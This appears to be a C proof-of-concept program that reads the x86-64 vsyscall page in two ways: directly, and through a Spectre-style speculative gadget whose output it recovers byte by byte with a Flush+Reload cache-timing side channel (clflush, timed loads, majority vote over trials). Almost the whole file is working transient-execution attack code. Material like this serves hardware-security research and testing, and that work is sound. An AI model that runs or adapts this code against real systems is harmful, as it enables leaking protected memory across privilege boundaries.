#define _GNU_SOURCE

#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

extern void spec_read_gadget(void *secret, void *probe_array);
extern long time_memory_load(void *ptr);
extern long time_memory_load_rdpru(void *ptr);
extern long time_memory_load_rdpru_aperf(void *ptr);

#ifdef USE_RDPRU_APERF
#define TIME_LOAD(ptr) time_memory_load_rdpru_aperf(ptr)
#elif defined(USE_RDPRU)
#define TIME_LOAD(ptr) time_memory_load_rdpru(ptr)
#else
#define TIME_LOAD(ptr) time_memory_load(ptr)
#endif

#define VSYSCALL_START  0xffffffffff600000UL
#define VSYSCALL_LEN    0x1000UL
#define PAGE_SIZE       4096
#define CACHE_LINE_SIZE 64
#define NUM_BYTE_SLOTS  256
#define HIT_THRESHOLD   100

static sigjmp_buf fault_buf;

static void segv_handler(int sig) {
    (void)sig;
    siglongjmp(fault_buf, 1);
}

static void flush_from_cache(void *buf, size_t bufsz) {
    char *p = buf;
    size_t n = (bufsz + CACHE_LINE_SIZE - 1) / CACHE_LINE_SIZE;
    for (size_t i = 0; i < n; i++)
        asm volatile("clflush (%0)" : : "r"(p + i * CACHE_LINE_SIZE) : "memory");
}

static unsigned int lcg_next(unsigned int state) {
    return state * 1664525u + 1013904223u;
}

static int probe(void *buf, int *order, unsigned int *lcg_state) {
    for (int i = 0; i < NUM_BYTE_SLOTS; i++)
        order[i] = i;
    for (int i = NUM_BYTE_SLOTS - 1; i > 0; i--) {
        *lcg_state = lcg_next(*lcg_state);
        int j = (int)(*lcg_state % (unsigned int)(i + 1));
        int tmp = order[i]; order[i] = order[j]; order[j] = tmp;
    }
    for (int i = 0; i < NUM_BYTE_SLOTS; i++) {
        char *ptr = (char *)buf + order[i] * PAGE_SIZE;
        if (TIME_LOAD(ptr) < HIT_THRESHOLD)
            return order[i];
    }
    return -1;
}

static void print_direct(void) {
    struct sigaction sa = { .sa_handler = segv_handler };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);

    volatile unsigned char *p = (volatile unsigned char *)VSYSCALL_START;

    for (uintptr_t i = 0; i < VSYSCALL_LEN; i++) {
        unsigned char byte;

        if (sigsetjmp(fault_buf, 1)) {
            printf("%016lx: fault\n", VSYSCALL_START + i);
            return;
        }

        byte = p[i];

        static unsigned char row[16];
        row[i % 16] = byte;

        if (i % 16 == 0)
            printf("%016lx: ", VSYSCALL_START + i);
        printf("%02x ", byte);
        if (i % 16 == 15) {
            printf(" |");
            for (int j = 0; j < 16; j++)
                printf("%c", (row[j] >= 32 && row[j] < 127) ? row[j] : '.');
            printf("|\n");
        }
    }
    printf("\n");
}

static void print_spectre(int num_trials) {
    size_t probe_size = (size_t)NUM_BYTE_SLOTS * PAGE_SIZE;
    void *probe_array = mmap(NULL, probe_size, PROT_READ | PROT_WRITE,
                             MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    int *order = malloc(NUM_BYTE_SLOTS * sizeof(int));
    unsigned int lcg_state = (unsigned int)time(NULL) ^ (unsigned int)getpid();

    if (probe_array == MAP_FAILED || order == NULL) {
        perror("setup");
        return;
    }
    memset(probe_array, 0, probe_size);

    for (uintptr_t i = 0; i < VSYSCALL_LEN; i++) {
        int hits[NUM_BYTE_SLOTS] = {0};
        void *target = (void *)(VSYSCALL_START + i);

        for (int t = 0; t < num_trials; t++) {
            flush_from_cache(probe_array, probe_size);
            spec_read_gadget(target, probe_array);
            int found = probe(probe_array, order, &lcg_state);
            if (found >= 0)
                hits[found]++;
        }

        int best = -1, best_count = 0;
        for (int v = 0; v < NUM_BYTE_SLOTS; v++) {
            if (hits[v] > best_count) {
                best_count = hits[v];
                best = v;
            }
        }

        unsigned char byte = best >= 0 ? (unsigned char)best : 0;

        static unsigned char row[16];
        row[i % 16] = byte;

        if (i % 16 == 0)
            printf("%016lx: ", VSYSCALL_START + i);
        printf("%02x ", byte);
        if (i % 16 == 15) {
            printf(" |");
            for (int j = 0; j < 16; j++)
                printf("%c", (row[j] >= 32 && row[j] < 127) ? row[j] : '.');
            printf("|\n");
        }
    }
    printf("\n");

    free(order);
    munmap(probe_array, probe_size);
}

int main(int argc, char **argv) {
    if (argc >= 2 && strcmp(argv[1], "--spectre") == 0) {
        int trials = argc >= 3 ? atoi(argv[2]) : 100;
        printf("reading vsyscall page via spectre rsb gadget (%d trials/byte)\n", trials);
        print_spectre(trials);
    } else {
        printf("reading vsyscall page directly\n");
        print_direct();
    }
    return 0;
}
